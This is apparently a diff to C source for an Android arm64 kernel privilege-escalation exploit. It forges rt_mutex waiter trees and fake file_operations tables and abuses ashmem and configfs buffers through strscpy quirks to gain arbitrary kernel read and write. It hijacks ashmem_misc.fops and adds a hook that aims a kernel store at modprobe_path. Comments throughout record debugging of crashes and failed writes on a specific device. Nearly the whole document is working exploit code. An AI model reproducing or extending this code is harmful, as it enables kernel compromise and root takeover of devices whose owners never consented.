@@ -692,6 +692,10 @@ _Static_assert(
 #endif
 
 uintptr_t page_base;
+
+/* Set by collect_controlled_mm_group() below once it has actually reclaimed an mm group, so the
+ * pipe stage can reuse that base instead of launching a second, competing KernelSnitch pass. */
+uintptr_t rmg_reclaimed_mm_base;
 uintptr_t fake_lock;
 uintptr_t fake_w0;
 uintptr_t fake_task;
@@ -703,6 +707,14 @@ uintptr_t binwrite_target;
 uintptr_t slide_p0_offset;
 uintptr_t slide_oracle_parent;
 uintptr_t slide_oracle_target;
+/* Optional redirect of the kernel-side store (see the APP_CLOSED_FOPS_ROUTE branch in
+ * populate_slide_payload below). 0 means "use the existing ashmem_misc.fops geometry",
+ * which is what every existing run uses. Set via slide_set_store_target() so the
+ * modprobe route can aim the same proven trigger at modprobe_path without disturbing
+ * the fops hijack that the AAR read primitive depends on. */
+static uintptr_t slide_store_target;
+void slide_set_store_target(uintptr_t target) { slide_store_target = target; }
+uintptr_t slide_get_store_target(void) { return slide_store_target; }
 uintptr_t p0_gate_page_struct;
 uintptr_t p0_probe_page_struct;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -807,9 +819,24 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
   uintptr_t pi_left = target;
   uintptr_t lock_owner = SLIDE_LOCK_OWNER_VALUE;
   uintptr_t waiter_task = task;
-  uintptr_t task_group = 0;
+  /* task_group MUST be a real task_group. The sched_setattr path this route exists
+   * to reach dereferences it; 0 gets us nowhere. Matches the value proven in
+   * prepare_p0_diag_gate_payload(). */
+  uintptr_t task_group = text_addr(ROOT_TASK_GROUP);
   uintptr_t pi_waiters = waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF;
-  uintptr_t pi_top_task = task;
+  /* pi_top_task MUST terminate the chain on a real task. `task` - the fake task
+   * pointing at ITSELF - is the exact failure already recorded for this route: a
+   * self-referential rb_leftmost sends rb_erase into rb_next() and then into
+   * garbage, and the kernel dies inside rt_mutex_dequeue_pi at rtmutex.c:1249.
+   * init_task is the correct terminator, again matching the p0 gate forge.
+   *
+   * Both of these used to be the bad defaults and the correction below lived only
+   * inside `#if defined(P0_ORACLE_PRODUCTION_SLOT)`, which is NOT DEFINED for this
+   * target - so every one of the SLIDE_BANK_SLOTS banks was built with
+   * pi_top_task == task and task_group == 0. That is what oopses the slide route
+   * at `slide pi stage=deadlock-accepted`, with the process group killed and the
+   * device left up. */
+  uintptr_t pi_top_task = text_addr(INIT_TASK);
   uint32_t waiter_prio = SLIDE_FAKE_WAITER_PRIO;
 
 #if defined(P0_ORACLE_PRODUCTION_SLOT)
@@ -1092,6 +1119,22 @@ int open_ashmem_device(void) {
   return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
 }
 
+/* Linear-map alias of a kernel-image symbol, derived from the kernel's own boot
+ * code rather than guessed. See the long comment on kimg_linear_alias() for the
+ * derivation; the short version is that memstart_addr cancels and the answer is
+ * PAGE_OFFSET + the link-time image offset, with NO slide term.
+ *
+ * The old form added slide_p0_offset, and that is exactly the measured bug: on the
+ * run with p0off=0xe0000 the code wrote to 0xffffff8002c12bf8 when the target was
+ * 0xffffff8002ab2bf8 - high by precisely the slide. The write returned 24 and the
+ * image was untouched, which is what an off-by-a-slide store looks like. */
+uintptr_t kimg_linear_alias(uintptr_t image_addr) {
+  return P0_PAGE_OFFSET + (image_addr - KIMAGE_TEXT_BASE);
+}
+
+/* Retained for callers that still want the physical-load-constant form; it is no
+ * longer used by the write path because its constants (P0_KERNEL_PHYS_LOAD,
+ * P0_PHYS_OFFSET) are unverified guesses, and the derivation above needs neither. */
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
@@ -1102,13 +1145,13 @@ uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
   return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
 }
 
+/* The write path uses the derived alias. Adding the slide here is a double count:
+ * KASLR moves the virtual mapping and the linear alias by the same amount, and
+ * kimage_voffset already accounts for it (arch/arm64/kernel/head.S:__primary_switched
+ * computes kimage_voffset = kimage_vaddr - __PHYS_OFFSET with kimage_vaddr holding
+ * the slid _text). */
 uintptr_t data_direct_addr(uintptr_t image_addr) {
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-  uintptr_t address = p0_data_alias(image_addr);
-  return data_alias_uses_slide ? address + slide_p0_offset : address;
-#else
-  return p0_data_alias(image_addr) + slide_p0_offset;
-#endif
+  return kimg_linear_alias(image_addr);
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
@@ -1144,9 +1187,60 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 }
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
+  /* Zero the WHOLE table before filling in the slots we actually want.
+   *
+   * This is a correctness fix, not tidiness. The struct file_operations layout
+   * on this 5.15 arm64 kernel (verified against our own
+   * include/linux/fs.h, "struct file_operations" at line 2110) is:
+   *
+   *   0x00 owner          0x08 llseek        0x10 read        0x18 write
+   *   0x20 read_iter      0x28 write_iter   0x30 iopoll      0x38 iterate
+   *   0x40 iterate_shared 0x48 poll          0x50 unlocked_ioctl
+   *   0x58 compat_ioctl  0x60 mmap          0x68 mmap_supported_flags
+   *   0x70 open           0x78 flush         0x80 release     0x88 fsync
+   *   0x90 fasync         0x98 lock          0xa0 sendpage    0xa8 get_unmapped_area
+   *   0xb0 check_flags    0xb8 flock         0xc0 splice_write
+   *   0xc8 splice_read    0xd0 setlease      0xd8 fallocate   0xe0 show_fdinfo
+   *   0xe8 copy_file_range 0xf0 remap_file_range 0xf8 fadvise
+   *
+   * `flush` at 0x78 is the one that matters. __fput() calls flush(file, &id)
+   * unconditionally, and the kernel helper is
+   *
+   *     if (f_op && f_op->flush) return f_op->flush(file, id);
+   *
+   * so the slot is dispatched on EVERY close() with no other test. We were
+   * never writing 0x78, so it held whatever the prepared reclaim page
+   * happened to contain - a non-NULL wild kernel pointer - and the close()
+   * immediately after the CFI owner check jumped straight into it. That is the
+   * panic at fops.c:689; the preceding log line is always
+   * "CFI owner read ret=8 value=0 errno=0" and main.c's
+   * "app fops slide attempt=..." never prints.
+   *
+   * NULL is also the CORRECT value here, not just a safe one: the real
+   * ashmem_fops does not implement .flush either, so zeroing reproduces the
+   * genuine table. Every other unpopulated slot (iopoll/iterate/poll/fsync/
+   * flock/fallocate/...) is dispatched the same way, so all of them are zeroed
+   * too. 0x100 covers every pointer member through fadvise.
+   */
+  memset(p + off, 0, 0x100);
   put64(p, off + FOPS_OWNER_OFF, 0);
-  put64(p, off + FOPS_LLSEEK_OFF,
-        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+  /* ->llseek must be a REAL callable function by the time the table is built.
+   *
+   * It used to be forged to `fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF` and then patched
+   * afterwards by repair_fake_fops_llseek() (src/fops.c), which tried to point it at
+   * noop_llseek through the configfs AAR. That repair is IMPOSSIBLE and always was: the
+   * AAR write into our own reclaimed page silently does not land. Measured on
+   * RFCWC0G1Z1J - three writes all returning 8, three reads showing unchanged memory,
+   * confirmed by two independent readers:
+   *     LLSEEK DIAG wr=8 rd=8 after=<unchanged> want=<noop_llseek>
+   *                nbr-16 wr=8 got=0  nbr+16 wr=8 got=0  direct_rd=8 direct=<unchanged>
+   * The old repair appeared to succeed only because the readback happened to equal
+   * whatever was already in the built table. So the value has to be correct HERE.
+   *
+   * noop_llseek is a real kernel function, which is the only safe thing to leave in a
+   * slot the kernel may call: leaving a data pointer (ashmem_misc.fops) there is a
+   * guaranteed jump-to-data the moment anything lseeks the fd. */
+  put64(p, off + FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK));
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
@@ -2261,8 +2355,35 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
 #endif
 #else
+    /* LIVE PATH for this target (APP_CLOSED_FOPS_ROUTE=1).
+     *
+     * The geometry is parent = an address inside our payload page, target = a kernel
+     * .data address. During the slide the KERNEL, executing its own
+     * rt_mutex_dequeue_pi/rb_erase over the forged tree, stores a pointer field at
+     * target as a side effect - we never perform that write ourselves. It is the only
+     * mechanism on this device MEASURED to put chosen bytes into kernel .data, and it
+     * is what gets ashmem_misc.fops to cfi_step=0 on every run.
+     *
+     * slide_store_target redirects that store at a different kernel .data address so
+     * the same proven trigger can be aimed at modprobe_path. 0 keeps the existing
+     * ashmem_misc.fops geometry, which is what every current run uses, so an unset
+     * value is byte-for-byte today's behaviour.
+     *
+     * IMPORTANT, and verified rather than assumed: the value the kernel deposits is a
+     * POINTER copied out of the forged tree (today it is fake_fops, which is what
+     * `CFI begin ... want=fake_fops` checks against). Aiming the store at modprobe_path
+     * therefore deposits 8 bytes of tree-supplied pointer, not 8 bytes of path text.
+     * Making the deposited value equal to path bytes requires the forged node to carry
+     * those bytes in the slot the erase copies, and requires that rb_erase/rt_mutex
+     * never dereferences them. That is the open design question - see MEMORY.md - and
+     * it is why this hook only redirects the TARGET for now and does not yet attempt a
+     * full 24-byte plant.
+     */
     slide_oracle_parent = fake_fops;
     slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
+    if (slide_store_target) {
+      slide_oracle_target = slide_store_target;
+    }
 #endif
   }
 #endif
@@ -2442,6 +2563,8 @@ static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
   }
   pr_info("controlled mm group selected base=%016zx mode=%d\n",
           base, payload_mode);
+  /* Publish the base we just reclaimed so the pipe stage can reuse it instead of re-grooming. */
+  rmg_reclaimed_mm_base = base;
   if (!prepare_skb_payload(base, payload_mode)) {
     for (size_t i = 0; i < mm_objs_per_slab; ++i) {
       if (target_fds[i] >= 0) {
@@ -3063,6 +3186,103 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   return 0;
 }
 
+/*
+ * Pick a bin_buffer_size the strscpy ladder can actually carry.
+ *
+ * cb_max_size is deliberately NON-ZERO (CFG_CB_MAX_SIZE_SENTINEL), which changes this
+ * search completely. cb_max_size occupies blob indices 89..92 and bin_buffer_size
+ * occupies 85..88, so they share the ladder word [88,96) - specifically bin_buffer_size
+ * byte 3 is the low byte of that word. With cb_max_size == 0 the word always contains a
+ * zero, so the ladder always zeroed it and bin_buffer_size byte 3 was forced to 0, which
+ * capped bin_buffer_size (an `int`) below 16 MB and therefore capped `pos` below 16 MB.
+ *
+ * That cap is what pinned `base`: low 24 bits of base must be 0 (they share a ladder
+ * word with the zeroed configfs state range), so base is 16 MB-aligned, so with pos < 16 MB
+ * the ONLY candidate is `target & ~0xFFFFFF` - and its byte 3 is inherited from the target.
+ * A target whose bits 24..31 are zero was therefore UNWRITABLE, full stop. Measured on
+ * RFCWC0G1Z1J: the guard slots 0xfffffffe0008d818 and 0xfffffffe00082418 both have byte 3
+ * == 0 and every candidate was rejected with ERANGE, which is the rotating
+ * "each boot dies at a different guarded object" failure.
+ *
+ * Filling cb_max_size with a value that has no zero byte keeps word [88,96) clean, so
+ * bin_buffer_size may use all four of its bytes and pos may range over the full positive
+ * `int`. `base` is then free to be any 16 MB-aligned address with a non-zero byte 3, which
+ * exists in abundance. This is safe because configfs_bin_write_iter (fs/configfs/file.c:256)
+ * only consults cb_max_size INSIDE the `end_offset > bin_buffer_size` grow branch, and we
+ * always choose bin_buffer_size >= end_offset, so that branch is never taken.
+ *
+ * All FOUR bytes of the result must be non-zero: bytes 0..2 share word [80,88) with the top
+ * half of `base`, and byte 3 shares word [88,96) with cb_max_size.
+ *
+ * Returns 0 when no candidate survives.
+ */
+#define CFG_CB_MAX_SIZE_SENTINEL 0x01010101u
+#define CFG_BIN_BUFFER_SIZE_MAX 0x7fffffffu
+
+static uint32_t choose_buffer_size(uintptr_t end) {
+  for (uintptr_t candidate_size = end; candidate_size <= CFG_BIN_BUFFER_SIZE_MAX;
+       candidate_size++) {
+    int usable = 1;
+    for (size_t i = 0; i < 4; i++) {
+      if (!((candidate_size >> (i * 8)) & 0xff)) {
+        usable = 0;
+        break;
+      }
+    }
+    if (usable) {
+      return (uint32_t)candidate_size;
+    }
+  }
+  return 0;
+}
+
+/*
+ * Build the name blob for one (base, buffer_size) pair and ask
+ * simulate_name_blob() whether the driver would receive the exact values we
+ * intend.
+ *
+ * This is the single source of truth for "does this plan survive strscpy".
+ * The base search uses it to keep looking instead of accepting the first
+ * candidate and failing the whole write at the final veto.
+ *
+ * A mangled base writes to the wrong kernel address; a non-zero cb_max_size
+ * sends configfs_bin_write_iter down the vmalloc/-EFBIG grow branch instead of
+ * the direct copy. Neither is ever acceptable, so this is a hard gate.
+ */
+static int name_blob_plan_survives(uintptr_t base, uint32_t buffer_size) {
+  unsigned char blob[ASHMEM_BLOB_LEN];
+  unsigned char sim[ASHMEM_BLOB_LEN];
+
+  /* Same fill-all-1 construction as the write plan: a zero tail would put a
+   * zero in the word holding part of `base`, the ladder would zero that word,
+   * and the pwrite would land at the wrong address. Zero only the state range. */
+  memset(blob, 1, sizeof(blob));
+  for (size_t o = CFG_MUTEX_OFF; o < CFG_CB_MAX_SIZE_OFF + 4; o++) {
+    blob[o - ASHMEM_NAME_PREFIX_LEN] = 0;
+  }
+  put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, base);
+  put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, buffer_size);
+  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN,
+        CFG_CB_MAX_SIZE_SENTINEL);
+
+  simulate_name_blob(blob, sizeof(blob), sim);
+
+  uint64_t survived_base = 0;
+  memcpy(&survived_base, sim + (CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN), 8);
+  uint32_t survived_sz = 0xffffffffu;
+  memcpy(&survived_sz, sim + (CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN),
+         4);
+  uint32_t survived_max = 0xffffffffu;
+  memcpy(&survived_max, sim + (CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN), 4);
+  /* cb_max_size must arrive intact too, not as 0. configfs_bin_write_iter only reads it
+   * inside the `end_offset > bin_buffer_size` grow branch (fs/configfs/file.c:256-260),
+   * and we always pick bin_buffer_size >= end_offset, so the value is never consulted -
+   * but it still has to survive the ladder, because its bytes share a word with
+   * bin_buffer_size byte 3. */
+  return survived_base == (uint64_t)base && survived_sz == buffer_size &&
+         survived_max == CFG_CB_MAX_SIZE_SENTINEL;
+}
+
 ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t len) {
   unsigned char blob[ASHMEM_BLOB_LEN];
   const uintptr_t write_align = 0x01000000ULL;
@@ -3103,6 +3323,7 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   const uintptr_t step = 0x1000ULL; /* keep the base page aligned */
   uintptr_t base = 0;
   off_t pos = 0;
+  uint32_t buffer_size = 0;
   uintptr_t start = target & ~(write_align - 1);
   for (uintptr_t delta = 0; delta <= (uintptr_t)max_write_window; delta += step) {
     if (delta > start) {
@@ -3123,8 +3344,33 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
         !((cand >> 56) & 0xff)) {
       continue;
     }
+    /* Only a 16 MB-aligned base can ever survive: the ladder always zeroes the
+     * word holding base bytes 0..2 (it shares that word with the zeroed configfs
+     * state range), so those three bytes must already be zero. `write_align` is
+     * 16 MB, so step by it and skip the 4 KB ladder entirely - that turns ~4k
+     * wasted iterations per candidate into one.
+     *
+     * This is what makes the previously-unwritable targets writable. With byte 3
+     * of base free to be anything, the search simply walks down to the next 16 MB
+     * boundary whose byte 3 is non-zero: for the guard slot 0xfffffffe0008d818
+     * the adjacent boundary 0xfffffffe00000000 has byte 3 == 0 and is dead, while
+     * 0xfffffffdff000000 (pos = 0x108d818) works. pos is allowed to exceed 16 MB
+     * now because cb_max_size no longer forces bin_buffer_size byte 3 to 0. */
+    if ((cand & (write_align - 1)) != 0) {
+      continue;
+    }
+    uint32_t cand_bs = choose_buffer_size(p + len);
+    if (!cand_bs) {
+      continue;
+    }
+    if (!name_blob_plan_survives(cand, cand_bs)) {
+      rmg_diag("WR base candidate skipped base=%016zx pos=%#zx bufsz=%#x "
+               "(strscpy would mangle it)\n", cand, (size_t)p, cand_bs);
+      continue;
+    }
     base = cand;
     pos = (off_t)p;
+    buffer_size = cand_bs;
     break;
   }
   if (!base) {
@@ -3132,54 +3378,20 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
     return -1;
   }
   uintptr_t end = (uintptr_t)pos + len;
-  uint32_t buffer_size = 0;
 
   if (end > max_write_window) {
     errno = ERANGE;
     return -1;
   }
-  /* The window must be able to reach a usable candidate, and that is NOT always `end`.
+  /* buffer_size was chosen together with `base` in the search above, because the two
+   * share a strscpy word and only the pair can be validated. It is therefore already
+   * non-zero and already proven to survive; there is nothing left to search here.
    *
-   * byte2 (bits 16-23) is constant across a whole 64 KB block, so if `end` lands in
-   * [0, 0x10000) then byte2 is 0 for every value in that entire sub-range and the first
-   * usable candidate is 0x10101 - up to 0x10101 away. The old 0x200 window could not span
-   * that, so the loop exited with buffer_size == 0 and returned ERANGE. Measured on
-   * RFCWC0G1Z1J: pos=0xb018 (end=0xb020) failed with errno=34, while pos=0xa6618
-   * (end=0xa6620, all three low bytes non-zero) succeeded on the very first candidate.
-   * This hits any target whose pos lands in a zero-byte region, not just one address.
-   *
-   * The heuristic itself is load-bearing and must NOT be dropped: bin_buffer_size shares an
-   * 8-byte strscpy word with `base` bytes 3-7 (blob word [80,88)). A zero in bytes 0-2 makes
-   * strscpy (lib/string.c:227) zero the whole word, so bin_buffer_size becomes 0, the driver
-   * takes the vmalloc grow branch at fs/configfs/file.c:262, and the write lands on a fresh
-   * heap page instead of the target. Wider window, same rule.
-   *
-   * The 0x1000000 break is a second, separate constraint: word [88,96) holds buffer_size
-   * byte3 alongside cb_max_size=0, so byte3 ALWAYS survives as 0. Any candidate with
-   * byte3 != 0 can never be transmitted, so the search must stop below 16 MB rather than
-   * pick a value the validator would later reject with EILSEQ. */
-  for (uintptr_t candidate_size = end;
-       candidate_size <= max_write_window && candidate_size - end < 0x10102;
-       candidate_size++) {
-    if (candidate_size >= 0x1000000ULL) {
-      break;
-    }
-    int usable = 1;
-    for (size_t i = 0; i < 3; i++) {
-      if (!((candidate_size >> (i * 8)) & 0xff)) {
-        usable = 0;
-        break;
-      }
-    }
-    if (usable) {
-      buffer_size = (uint32_t)candidate_size;
-      break;
-    }
-  }
-  if (!buffer_size) {
-    errno = ERANGE;
-    return -1;
-  }
+   * See choose_buffer_size() for why the zero-byte rule exists at all: bin_buffer_size
+   * shares an 8-byte strscpy word with `base` bytes 3-7, and a zero in bytes 0-2 makes
+   * strscpy (lib/string.c:227) zero the whole word, so bin_buffer_size becomes 0, the
+   * driver takes the vmalloc grow branch at fs/configfs/file.c:262, and the write lands
+   * on a fresh heap page instead of the target. */
   /* Same fill-all-1 construction as the read plan, for the same reason: a zero tail
    * would put a zero in the word holding part of `base`, the ladder would zero that
    * word, and the pwrite would land at the wrong address. Zero only the state range. */
@@ -3189,26 +3401,55 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   }
   put64(blob, CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN, base);
   put32(blob, CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, buffer_size);
-  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
+  /* cb_max_size MUST be the no-zero-byte sentinel, never 0.
+   *
+   * cb_max_size (blob indices 89..92) shares ladder word [88,96) with
+   * bin_buffer_size byte 3 (blob index 88). Sending 0 puts a NUL in that word, the
+   * strscpy ladder zeroes the whole word, and the driver receives
+   * bin_buffer_size = 0x00010101 = 65793 instead of 0x01010101 = 16843009. Every
+   * realistic target then has end_offset > 65793, so configfs_bin_write_iter takes
+   * the vmalloc grow branch (fs/configfs/file.c:257): it vfree()s the forged
+   * bin_buffer, installs a FRESH heap page, and copy_from_iter() writes the payload
+   * there. pwrite still returns `len`, so the call looks successful and the target is
+   * never touched - the exact "write ABSORBED" signature measured on RFCWC0G1Z1J.
+   *
+   * cb_max_size is only read inside that same grow branch (file.c:257 and the
+   * non-bin fill at :137), so a value that is never reached cannot cause -EFBIG.
+   * Setting the sentinel therefore both keeps the word clean and is inert. */
+  put32(blob, CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN,
+        CFG_CB_MAX_SIZE_SENTINEL);
   {
-    /* Refuse the plan if `base` (which becomes buffer->bin_buffer) would be mangled, or
-     * if bin_buffer_size/cb_max_size would not land. A mangled base writes to the wrong
-     * kernel address; a non-zero cb_max_size sends configfs_bin_write_iter down the
-     * vmalloc/-EFBIG grow branch instead of the direct copy. */
+    /* Final authority: simulate the EXACT blob about to be handed to the ladder.
+     *
+     * The previous version called name_blob_plan_survives(base, buffer_size), which
+     * rebuilds its own blob - with the sentinel - and so validated a blob that was
+     * never sent. The real blob carried cb_max_size = 0, the check passed, and every
+     * write was silently absorbed. Simulating `blob` itself is the only test that can
+     * see the delivered numbers, so it is what runs here, and its result is logged on
+     * both outcomes: a silent success that later turns out to have a mangled plan is
+     * the failure mode this veto exists to prevent. */
     unsigned char sim[ASHMEM_BLOB_LEN];
-    simulate_name_blob(blob, sizeof(blob), sim);
     uint64_t survived_base = 0;
-    memcpy(&survived_base, sim + (CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN), 8);
     uint32_t survived_sz = 0xffffffffu;
-    memcpy(&survived_sz, sim + (CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN), 4);
     uint32_t survived_max = 0xffffffffu;
-    memcpy(&survived_max, sim + (CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN), 4);
+    simulate_name_blob(blob, sizeof(blob), sim);
+    memcpy(&survived_base, sim + (CFG_BIN_BUFFER_OFF - ASHMEM_NAME_PREFIX_LEN), 8);
+    memcpy(&survived_sz,
+           sim + (CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN), 4);
+    memcpy(&survived_max,
+           sim + (CFG_CB_MAX_SIZE_OFF - ASHMEM_NAME_PREFIX_LEN), 4);
+    rmg_diag("WR plan delivered base=%016llx sz=%u max=%u "
+             "(want base=%016zx sz=%u max=%u) target=%016zx pos=%#zx len=%zu\n",
+             (unsigned long long)survived_base, survived_sz, survived_max, base,
+             buffer_size, CFG_CB_MAX_SIZE_SENTINEL, target, (size_t)pos, len);
     if (survived_base != (uint64_t)base || survived_sz != buffer_size ||
-        survived_max != 0) {
+        survived_max != (uint32_t)CFG_CB_MAX_SIZE_SENTINEL ||
+        (uintptr_t)pos + len > (uintptr_t)survived_sz) {
       rmg_diag("WR plan REJECTED: base=%016zx->%016llx sz=%u->%u max=%u->%u "
-               "target=%016zx len=%zu\n",
-               base, (unsigned long long)survived_base, buffer_size, survived_sz, 0u,
-               survived_max, target, len);
+               "end=%zu target=%016zx len=%zu\n",
+               base, (unsigned long long)survived_base, buffer_size, survived_sz,
+               CFG_CB_MAX_SIZE_SENTINEL, survived_max, (size_t)pos + len, target,
+               len);
       errno = EILSEQ;
       return -1;
     }
@@ -3231,13 +3472,61 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
   ssize_t wr = pwrite(fd, data, len, pos);
   rmg_diag("WR pwrite ret=%zd errno=%d base=%016zx pos=%#zx len=%zu target=%016zx\n",
            wr, errno, base, (size_t)pos, len, target);
+  /* Predict what configfs_bin_write_iter will do with these numbers, so a run can
+   * be judged without re-deriving it. If `grows` is true the kernel takes
+   *      tbuf = vmalloc(end_offset); ... vfree(bin_buffer); ... bin_buffer = tbuf;
+   * and the payload lands on a FRESH heap page: pwrite still returns len, but the
+   * intended kernel address is never touched. That is exactly the signature of
+   * "write ABSORBED", and it is the leading explanation for writes that return
+   * success while changing nothing. end_offset and the size are both `int` in the
+   * kernel, so the comparison is a signed one.
+   *
+   * NOTE this is the size WE intend to install. Whether the strscpy ladder
+   * actually delivers it intact is the open question - bin_buffer_size shares an
+   * 8-byte word with cb_max_size, which must be zero, and strscpy zeroes from the
+   * first NUL in a word onward (lib/string.c:216). That is why the log prints the
+   * intended value alongside, and why the image readback remains the only
+   * authority: a linear-map READ is fatal on this device, so the write can never
+   * be verified at its own address. */
+  if (len > 0) {
+    int end_offset = (int)((uintptr_t)pos + len);
+    int grows = end_offset > (int)buffer_size;
+    rmg_diag("WR predict end_offset=%d bin_buffer_size=%d grows=%d (grow => kernel "
+             "vfree()s the forged pointer and the data lands on a fresh page)\n",
+             end_offset, (int)buffer_size, grows);
+  }
   return wr;
 }
+
+/* Quiet mode for bulk reads.
+ *
+ * configfs_read_once() narrates every step, which is exactly what a single
+ * diagnostic read wants and exactly what a 30k-iteration memory scan cannot
+ * afford: 30k reads x 2 lines would add ~6 MB to the fsync'd durable log and
+ * slow the scan to a crawl. The static-work scan sets this around its reads
+ * and reports its own aggregate counters instead, so nothing is lost - the
+ * per-read narration is redundant with the scan's rejection counters. */
+int configfs_quiet = 0;
+
+/* Total successful+attempted calls into the reader, so a stage can report how much
+ * of the per-run read budget it spent. Multiple runs died at scan chunk 3008 and
+ * 3072 and again immediately after a forge that followed a ~2900-chunk scan, which
+ * is consistent with a finite budget rather than with any particular address. */
+unsigned long configfs_read_count = 0;
+
+#define CFG_DIAG(...)               \
+  do {                              \
+    if (!configfs_quiet) {          \
+      rmg_diag(__VA_ARGS__);        \
+    }                               \
+  } while (0)
 
 ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   unsigned char blob[ASHMEM_BLOB_LEN];
   uintptr_t page = 0;
   off_t pos = 0;
+
+  configfs_read_count++;
 
   if (!data || !len || len > SSIZE_MAX) {
     errno = EINVAL;
@@ -3326,11 +3615,29 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
        * Without this, roughly 0.384% of reads are unplannable at any fixed length, and a
        * single unlucky fd_array page aborts the whole scan. The extra bytes are read
        * from just past the target, inside the same object, so the width stays small. */
-      unsigned char wide[4096];
+      unsigned char wide[8192];
       size_t want = len;
-      size_t cap = (len + 256) & ~(size_t)7;
+      /* Widen the candidate lengths far enough that a 512-byte read can find a clean
+       * intermediate pointer.
+       *
+       * read_offset = ASHMEM_PREFIX_COUNT - len, so `page` = target - (COUNT - len): the
+       * LENGTH chooses the intermediate pointer, and the bytes actually copied still begin at
+       * `target` (the driver copies count - ki_pos from page + ki_pos, and page + ki_pos ==
+       * target by construction). Widening therefore only moves the intermediate pointer.
+       *
+       * This matters concretely: pipe_reclaim_cache_gate() needs the whole 512-byte
+       * kmalloc_caches table (KMALLOC_CACHE_SLOTS 64 x 8). Its measured ret was 336, i.e. the
+       * plan was truncated, so slots 18..41 were never filled in and the gate compared against
+       * whatever was already in the caller's buffer - which is why the cgroup rows read as
+       * garbage (fdfdb944..., ffffffff62f0) while slots 0..17 were valid. The old cap was
+       * want + 256, far too little to escape a zero byte at len=512, so the gate could never
+       * see the real table. */
+      size_t cap = (len + 4096) & ~(size_t)7;
       if (cap > sizeof(wide)) {
         cap = sizeof(wide);
+      }
+      if (cap < want + 8) {
+        cap = want + 8;
       }
       for (size_t try_len = want + 8; try_len <= cap; try_len += 8) {
         uint64_t try_off = ASHMEM_PREFIX_COUNT - (uint64_t)try_len;
@@ -3354,17 +3661,17 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
         errno = 0;
         ssize_t wr = pread(fd, wide, try_len, (off_t)try_off);
         if (wr != (ssize_t)try_len) {
-          rmg_diag("RD wide read failed len=%zu ret=%zd errno=%d, next width\n", try_len, wr,
+          CFG_DIAG("RD wide read failed len=%zu ret=%zd errno=%d, next width\n", try_len, wr,
                    errno);
           continue;
         }
         memcpy(data, wide, want);
-        rmg_diag("RD widened len %zu->%zu to dodge a zero byte in page=%016zx "
+        CFG_DIAG("RD widened len %zu->%zu to dodge a zero byte in page=%016zx "
                  "target=%016zx\n",
                  want, try_len, try_page, target);
         return (ssize_t)want;
       }
-      rmg_diag("RD plan REJECTED: page=%016zx mangled to %016llx by strscpy, and no "
+      CFG_DIAG("RD plan REJECTED: page=%016zx mangled to %016llx by strscpy, and no "
                "width in [%zu,%zu] dodged it (target=%016zx)\n",
                page, (unsigned long long)survived_page, want, cap, target);
       errno = EILSEQ;
@@ -3376,7 +3683,7 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
     uint32_t survived_nrf = 0xffffffffu;
     memcpy(&survived_nrf, sim + (CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN), 4);
     if (survived_nrf != 0) {
-      rmg_diag("RD plan REJECTED: needs_read_fill=%u (fill_read_buffer would block) "
+      CFG_DIAG("RD plan REJECTED: needs_read_fill=%u (fill_read_buffer would block) "
                "target=%016zx len=%zu\n",
                survived_nrf, target, len);
       errno = EILSEQ;
@@ -3387,7 +3694,7 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
